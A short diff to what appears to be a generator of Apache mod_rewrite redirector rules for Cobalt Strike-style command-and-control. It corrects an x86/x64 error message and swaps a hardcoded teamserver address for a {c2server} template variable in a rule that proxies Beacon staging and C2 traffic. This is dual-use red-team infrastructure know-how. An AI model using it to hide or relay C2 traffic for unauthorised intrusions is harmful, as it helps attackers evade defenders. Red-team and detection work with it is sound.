@@ -100,7 +100,7 @@ else:
 http_stager_start = contents.find(http_stager)
 if contents.find(set_uri_64) == -1:
     stager_uri_64 = ""
-    errors += "[!] x86 Stager URIs Not Found\n"
+    errors += "[!] x64 Stager URIs Not Found\n"
     errorfound = True
 else:
     stager_uri_start  = contents.find(set_uri_64, http_stager_start) + len(set_uri_64)
@@ -137,7 +137,7 @@ RewriteEngine On
 ## Default Beacon Staging Support (/1234)
 RewriteCond %{{REQUEST_URI}} ^/..../?$
 RewriteCond %{{HTTP_USER_AGENT}} "{ua}"
-RewriteRule ^.*$ "http://TEAMSERVER%{{REQUEST_URI}}" [P,L]
+RewriteRule ^.*$ "{c2server}%{{REQUEST_URI}}" [P,L]
 
 ## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
 ## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
